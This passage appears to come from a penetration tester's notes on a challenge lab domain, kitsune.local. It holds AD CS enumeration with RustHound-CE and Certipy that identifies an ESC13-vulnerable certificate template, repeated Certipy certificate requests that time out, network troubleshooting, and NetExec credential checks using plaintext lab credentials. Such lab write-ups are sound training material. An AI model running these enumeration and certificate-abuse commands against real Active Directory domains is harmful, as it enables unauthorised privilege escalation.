+[2026-11-06T09:34:04Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
+[2026-11-06T09:34:04Z INFO  rusthound_ce::modules::session] [sessions] 1 active target(s) after expiry/enabled filter
+[2026-11-06T09:34:09Z WARN  rusthound_ce::modules::session] [DC01.KITSUNE.LOCAL] SRVSVC rc=5 ACCESS_DENIED (hardened / non-admin)
+[2026-11-06T09:34:09Z WARN  rusthound_ce::modules::session] [DC01.KITSUNE.LOCAL] WKSSVC rc=5 (local admin required)
+[2026-11-06T09:34:09Z WARN  rusthound_ce::modules::session] DC01.KITSUNE.LOCAL WINREG: protocol: open \winreg: SMB2 status 0xc00000ac for command 0x0005 (RemoteRegistry stopped?)
+[2026-11-06T09:34:09Z INFO  rusthound_ce::modules::session] [sessions] 0 session(s) enumerated in total across 1 host(s)
+[2026-11-06T09:34:09Z INFO  rusthound_ce::modules] Starting ESC8 web enrollment probe on 1 CA(s)...
+[2026-11-06T09:34:33Z INFO  rusthound_ce::modules::gpo::sysvol] [gpo] collected directives from 1 GPO(s) on DC01.kitsune.local SYSVOL
+[2026-11-06T09:34:33Z INFO  rusthound_ce::modules] [gpo] mapping 1 GPO(s) to GPOChanges / UserRights
+[2026-11-06T09:34:33Z INFO  rusthound_ce::modules::localgroup] [localgroups] 1 active target(s) after expiry/enabled filter
+[2026-11-06T09:34:41Z INFO  rusthound_ce::modules::localgroup] [localgroups] 4 edge(s) across 1 host(s)
+[2026-11-06T09:34:41Z INFO  rusthound_ce::modules::webclient] [webclient] 1 active target(s) after expiry/enabled filter
+[2026-11-06T09:34:42Z INFO  rusthound_ce::modules::webclient] [webclient] WebClient running on 0/1 probed host(s)
+[2026-11-06T09:34:42Z INFO  rusthound_ce::modules::registry] [careg] reading CA registry over MS-RRP on 1 of 1 CA(s)
+[2026-11-06T09:34:49Z INFO  rusthound_ce::modules::registry] [careg] EditFlags collected on 1 CA(s)
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 10 users parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 65 groups parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] 4 issuancepolicies parsed!
+[2026-11-06T09:34:49Z INFO  rusthound_ce::json::maker::common] ./bloodhound_loot//20261106150449_kitsune-local_rusthound-ce.zip created!
+
+RustHound-CE Enumeration Completed at 15:04:49 on 11/06/26! Happy Graphing!
+```
+
+### BloodHound
+
+![](img/03-bloodhound-ranch-enroll-rights.png)
+
+#### Enum CA
+```bash
+[manthan@manthanbhatt ~]$ certipy find -u ranch@kitsune.local -p 'R@nch2026!' -dc-ip 10.0.30.161 -target -DC01.kitsune.local -ldap-scheme ldap -vulnerable -stdout
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 16 issuance policies
+[*] Found 1 OID linked to a template
+[*] Retrieving CA configuration for 'kitsune-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'kitsune-DC01-CA'
+[*] Checking web enrollment for CA 'kitsune-DC01-CA' @ 'DC01.kitsune.local'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : kitsune-DC01-CA
+    DNS Name                            : DC01.kitsune.local
+    Certificate Subject                 : CN=kitsune-DC01-CA, DC=kitsune, DC=local
+    Certificate Serial Number           : 23E87814E94E648848405CFD9514BD14
+    Certificate Validity Start          : 2026-10-12 21:14:31+00:00
+    Certificate Validity End            : 2125-10-12 21:24:31+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : KITSUNE.LOCAL\Administrators
+      Access Rights
+        ManageCa                        : KITSUNE.LOCAL\Administrators
+                                          KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Enterprise Admins
+        ManageCertificates              : KITSUNE.LOCAL\Administrators
+                                          KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Enterprise Admins
+        Enroll                          : KITSUNE.LOCAL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : Kitsune-User
+    Display Name                        : Kitsune-User
+    Certificate Authorities             : kitsune-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireEmail
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 99 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Template Created                    : 2026-10-12T22:12:00+00:00
+    Template Last Modified              : 2026-10-13T00:52:56+00:00
+    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.10863307.14988779.16010669.3757508.10421200.134.6077557.15214621
+    Linked Groups                       : CN=HelpDesk,CN=Users,DC=kitsune,DC=local
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Domain Users
+                                          KITSUNE.LOCAL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : KITSUNE.LOCAL\Administrator
+        Full Control Principals         : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Enterprise Admins
+        Write Owner Principals          : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Enterprise Admins
+        Write Dacl Principals           : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Enterprise Admins
+        Write Property Enroll           : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Domain Users
+                                          KITSUNE.LOCAL\Enterprise Admins
+    [+] User Enrollable Principals      : KITSUNE.LOCAL\Domain Users
+    [!] Vulnerabilities
+      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'.
+[manthan@manthanbhatt ~]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ certipy req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.0.30.161 -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -dynamic-endpoint -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.0.30.161'
+[+] DC IP: '10.0.30.161'
+[+] DC Host: 'KITSUNE.LOCAL'
+[+] Target IP: None
+[+] Remote Name: 'KITSUNE.LOCAL'
+[+] Domain: 'KITSUNE.LOCAL'
+[+] Username: 'RANCH'
+[+] Trying to resolve 'KITSUNE.LOCAL' at '10.0.30.161'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to resolve dynamic endpoint 91AE6020-9E3C-11CF-8D7C-00AA00C091BE
+[+] Resolved dynamic endpoint 91AE6020-9E3C-11CF-8D7C-00AA00C091BE to ncacn_ip_tcp:10.0.30.161[49791]
+[+] Trying to connect to endpoint: ncacn_ip_tcp:10.0.30.161[49791]
+[+] Connected to endpoint: ncacn_ip_tcp:10.0.30.161[49791]
+[*] Request ID is 21
+[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
+Would you like to save the private key? (y/N): 
+[-] Failed to request certificate
+[manthan@manthanbhatt Kitsune]$ certipy req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.0.30.161 -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096 -dynamic-endpoint -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.0.30.161'
+[+] DC IP: '10.0.30.161'
+[+] DC Host: 'KITSUNE.LOCAL'
+[+] Target IP: None
+[+] Remote Name: 'KITSUNE.LOCAL'
+[+] Domain: 'KITSUNE.LOCAL'
+[+] Username: 'RANCH'
+[+] Trying to resolve 'KITSUNE.LOCAL' at '10.0.30.161'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to resolve dynamic endpoint 91AE6020-9E3C-11CF-8D7C-00AA00C091BE
+[+] Resolved dynamic endpoint 91AE6020-9E3C-11CF-8D7C-00AA00C091BE to ncacn_ip_tcp:10.0.30.161[49791]
+[+] Trying to connect to endpoint: ncacn_ip_tcp:10.0.30.161[49791]
+[+] Connected to endpoint: ncacn_ip_tcp:10.0.30.161[49791]
+[-] Got error: timed out
+Traceback (most recent call last):
+  File "/usr/share/certipy/certipy/entry.py", line 67, in main
+    actions[options.action](options)
+    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/commands/parsers/req.py", line 29, in entry
+    req.entry(options)
+    ~~~~~~~~~^^^^^^^^^
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/commands/req.py", line 62, in entry
+    _ = request.request()
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/req.py", line 1531, in request
+    cert = self.interface.request(csr_der, attributes)
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/req.py", line 1058, in request
+    response = self.dce_request(request)
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/req.py", line 981, in dce_request
+    return self.dce.request(request, checkError=False)
+           ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1415, in request
+    answer = self.recv()
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1870, in recv
+    response_data = self._transport.recv(forceRecv, count=MSRPCRespHeader._SIZE)
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/impacket/dcerpc/v5/transport.py", line 385, in recv
+    chunk = self.__socket.recv(count-len(buffer))
+TimeoutError: timed out
+[manthan@manthanbhatt Kitsune]$ certipy req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.0.30.161 -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096 -dynamic-endpoint -timeout 60 -debug 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.0.30.161'
+[+] DC IP: '10.0.30.161'
+[+] DC Host: 'KITSUNE.LOCAL'
+[+] Target IP: None
+[+] Remote Name: 'KITSUNE.LOCAL'
+[+] Domain: 'KITSUNE.LOCAL'
+[+] Username: 'RANCH'
+[+] Trying to resolve 'KITSUNE.LOCAL' at '10.0.30.161'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to resolve dynamic endpoint 91AE6020-9E3C-11CF-8D7C-00AA00C091BE
+[+] Resolved dynamic endpoint 91AE6020-9E3C-11CF-8D7C-00AA00C091BE to ncacn_ip_tcp:10.0.30.161[49791]
+[+] Trying to connect to endpoint: ncacn_ip_tcp:10.0.30.161[49791]
+[+] Connected to endpoint: ncacn_ip_tcp:10.0.30.161[49791]
+[-] Got error: timed out
+Traceback (most recent call last):
+  File "/usr/share/certipy/certipy/entry.py", line 67, in main
+    actions[options.action](options)
+    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/commands/parsers/req.py", line 29, in entry
+    req.entry(options)
+    ~~~~~~~~~^^^^^^^^^
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/commands/req.py", line 62, in entry
+    _ = request.request()
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/req.py", line 1531, in request
+    cert = self.interface.request(csr_der, attributes)
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/req.py", line 1058, in request
+    response = self.dce_request(request)
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/req.py", line 981, in dce_request
+    return self.dce.request(request, checkError=False)
+           ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1415, in request
+    answer = self.recv()
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1870, in recv
+    response_data = self._transport.recv(forceRecv, count=MSRPCRespHeader._SIZE)
+  File "/usr/share/certipy/venv/lib/python3.14/site-packages/impacket/dcerpc/v5/transport.py", line 385, in recv
+    chunk = self.__socket.recv(count-len(buffer))
+TimeoutError: timed out
+[manthan@manthanbhatt Kitsune]$ 
+```
+**`Note:`** Timeout of 2 mins also failed so reset the machine
+**`New IP:`**: 10.1.79.35
+Still timeout errors 
+maybe due to udp protocol in vpn trying reducing the mtu, going with 1000 mtu
+```bash
+[manthan@manthanbhatt Kitsune]$ certipy req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.1.79.35 -target-ip 10.1.79.35 -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096 -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.1.79.35'
+[+] DC IP: '10.1.79.35'
+[+] DC Host: 'KITSUNE.LOCAL'
+[+] Target IP: '10.1.79.35'
+[+] Remote Name: '10.1.79.35'
+[+] Domain: 'KITSUNE.LOCAL'
+[+] Username: 'RANCH'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.1.79.35[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.1.79.35[\pipe\cert]
+[-] Got error: The NETBIOS connection with the remote host timed out.
+Traceback (most recent call last):
+  File "/usr/lib/python3.14/site-packages/impacket/nmb.py", line 987, in non_polling_read
+    received = self._sock.recv(bytes_left)
+TimeoutError: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.14/site-packages/certipy/entry.py", line 67, in main
+    actions[options.action](options)
+    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/certipy/commands/parsers/req.py", line 29, in entry
+    req.entry(options)
+    ~~~~~~~~~^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/certipy/commands/req.py", line 62, in entry
+    _ = request.request()
+  File "/usr/lib/python3.14/site-packages/certipy/lib/req.py", line 1531, in request
+    cert = self.interface.request(csr_der, attributes)
+  File "/usr/lib/python3.14/site-packages/certipy/lib/req.py", line 1058, in request
+    response = self.dce_request(request)
+  File "/usr/lib/python3.14/site-packages/certipy/lib/req.py", line 981, in dce_request
+    return self.dce.request(request, checkError=False)
+           ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1414, in request
+    self.call(request.opnum, request, uuid)
+    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1403, in call
+    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
+           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1860, in send
+    self._transport_send(data)
+    ~~~~~~~~~~~~~~~~~~~~^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1797, in _transport_send
+    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
+    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/transport.py", line 548, in send
+    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/smbconnection.py", line 569, in writeFile
+    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/smb3.py", line 1749, in writeFile
+    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
+  File "/usr/lib/python3.14/site-packages/impacket/smb3.py", line 1451, in write
+    ans = self.recvSMB(packetID)
+  File "/usr/lib/python3.14/site-packages/impacket/smb3.py", line 515, in recvSMB
+    data = self._NetBIOSSession.recv_packet(self._timeout)
+  File "/usr/lib/python3.14/site-packages/impacket/nmb.py", line 918, in recv_packet
+    data = self.__read(timeout)
+  File "/usr/lib/python3.14/site-packages/impacket/nmb.py", line 1005, in __read
+    data = self.read_function(4, timeout)
+  File "/usr/lib/python3.14/site-packages/impacket/nmb.py", line 989, in non_polling_read
+    raise NetBIOSTimeout
+impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.
+[manthan@manthanbhatt Kitsune]$ 
+
+```
+Still fails, trying brute force with 800 mtu
+```bash
+[manthan@manthanbhatt Kitsune]$ for i in {1..20}; do echo "=== $i ==="; certipy req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.1.79.35 -target-ip 10.1.79.35 -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096; sleep 3; done   
+=== 1 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+=== 2 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+=== 3 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+=== 4 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+=== 5 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+=== 6 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+=== 7 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+=== 8 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+=== 9 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+=== 10 ===
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+```
+
+`Tried with explicit TCP protocol in vpn`
+```bash
+sudo openvpn --config ~/Downloads/vpn/challenge_lab_kitsun.ovpn --proto tcp
+manthan@manthanbhatt Kitsune]$ certipy req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.1.79.35 -target-ip 10.1.79.35 -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096 -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.1.79.35'
+[+] DC IP: '10.1.79.35'
+[+] DC Host: 'KITSUNE.LOCAL'
+[+] Target IP: '10.1.79.35'
+[+] Remote Name: '10.1.79.35'
+[+] Domain: 'KITSUNE.LOCAL'
+[+] Username: 'RANCH'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.1.79.35[\pipe\cert]
+[!] Failed to connect to endpoint ncacn_np:10.1.79.35[\pipe\cert]: [Errno Connection error (10.1.79.35:445)] timed out
+Traceback (most recent call last):
+  File "/usr/lib/python3.14/site-packages/impacket/nmb.py", line 905, in _setup_connection
+    sock.connect(sa)
+    ~~~~~~~~~~~~^^^^
+TimeoutError: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.14/site-packages/certipy/lib/rpc.py", line 219, in _try_binding
+    dce.connect()
+    ~~~~~~~~~~~^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
+    return self._transport.connect()
+           ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/transport.py", line 517, in connect
+    self.setup_smb_connection()
+    ~~~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/transport.py", line 509, in setup_smb_connection
+    self.__smb_connection = SMBConnection(self.getRemoteName(), self.getRemoteHost(), sess_port=self.get_dport(),
+                            ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                                          preferredDialect=self.__prefDialect, timeout=self.get_connect_timeout())
+                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/smbconnection.py", line 93, in __init__
+    self.negotiateSession(preferredDialect)
+    ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/smbconnection.py", line 134, in negotiateSession
+    packet = self.negotiateSessionWildcard(self._myName, self._remoteName, self._remoteHost, self._sess_port,
+                                           self._timeout, True, flags1=flags1, flags2=flags2, data=negoData)
+  File "/usr/lib/python3.14/site-packages/impacket/smbconnection.py", line 183, in negotiateSessionWildcard
+    self._nmbSession = nmb.NetBIOSTCPSession(myName, remoteName, remoteHost, nmb.TYPE_SERVER, sess_port,
+                       ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                                             timeout)
+                                             ^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/nmb.py", line 896, in __init__
+    NetBIOSSession.__init__(self, myname, remote_name, remote_host, remote_type=remote_type, sess_port=sess_port,
+    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                            timeout=timeout, local_type=local_type, sock=sock)
+                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/nmb.py", line 756, in __init__
+    self._sock = self._setup_connection((remote_host, sess_port), timeout)
+                 ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/impacket/nmb.py", line 908, in _setup_connection
+    raise socket.error("Connection error (%s:%s)" % (peer[0], peer[1]), e)
+OSError: [Errno Connection error (10.1.79.35:445)] timed out
+[+] Trying to resolve dynamic endpoint 91AE6020-9E3C-11CF-8D7C-00AA00C091BE
+[!] Failed to connect to endpoint mapper: Could not connect: timed out
+Traceback (most recent call last):
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/transport.py", line 354, in connect
+    self.__socket.connect(sa)
+    ~~~~~~~~~~~~~~~~~~~~~^^^^
+TimeoutError: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.14/site-packages/certipy/lib/rpc.py", line 166, in get_dynamic_endpoint
+    dce.connect()
+    ~~~~~~~~~~~^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
+    return self._transport.connect()
+           ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.14/site-packages/impacket/dcerpc/v5/transport.py", line 357, in connect
+    raise DCERPCException("Could not connect: %s" % msg)
+impacket.dcerpc.v5.rpcrt.DCERPCException: Could not connect: timed out
+[-] Failed to get dynamic TCP endpoint for 91AE6020-9E3C-11CF-8D7C-00AA00C091BE
+[-] Got error: Failed to get DCE RPC connection
+Traceback (most recent call last):
+  File "/usr/lib/python3.14/site-packages/certipy/entry.py", line 67, in main
+    actions[options.action](options)
+    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/certipy/commands/parsers/req.py", line 29, in entry
+    req.entry(options)
+    ~~~~~~~~~^^^^^^^^^
+  File "/usr/lib/python3.14/site-packages/certipy/commands/req.py", line 62, in entry
+    _ = request.request()
+  File "/usr/lib/python3.14/site-packages/certipy/lib/req.py", line 1531, in request
+    cert = self.interface.request(csr_der, attributes)
+  File "/usr/lib/python3.14/site-packages/certipy/lib/req.py", line 1055, in request
+    raise Exception("Failed to get DCE RPC connection")
+Exception: Failed to get DCE RPC connection
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+`Trying Impacket`
+Failed too
+
+### Further debugging
+Confirmed basic SMB auth still works fine on the new IP:
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.1.79.35 -u ranch -p 'R@nch2026!'
+SMB         10.1.79.35      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.1.79.35      445    DC01             [+] kitsune.local\ranch:R@nch2026!
+```
+
+**Path MTU probing** — large ICMP packets silently dropped (no frag-needed reply), small ones fine:
+```bash
+ping -c 3 -M do -s 1400 10.1.79.35   # 100% loss
+ping -c 2 -M do -s 1300 10.1.79.35   # OK
+ping -c 2 -M do -s 1000 10.1.79.35   # OK
+ping -c 2 -M do -s 800  10.1.79.35   # OK
+```
+Looked like a PMTUD black hole over the VPN tunnel, but **ruled out as the cause**: already tried `certipy req` with VPN `--tun-mtu 1000` and `800` (see above) — cert request still timed out the same way at both. MTU is not the blocker.
+
+**Checked for a way to enroll locally instead of over RPC through the tunnel** (would sidestep the broken RPC path entirely):
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc winrm 10.1.79.35 -u ranch -p 'R@nch2026!'
+WINRM       10.1.79.35      5985   DC01             [*] Windows 11 / Server 2025 (name:DC01) (domain:kitsune.local)
+WINRM       10.1.79.35      5985   DC01             [-] kitsune.local\ranch:R@nch2026!
+```
+`ranch` is **not** in Remote Management Users → WinRM denied.
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc rdp 10.1.79.35 -u ranch -p 'R@nch2026!'
+```
+No output at all despite port 3389 showing open in the original nmap scan — RDP auth attempt appears silently blocked/unresponsive. No local-enrollment workaround available.
+
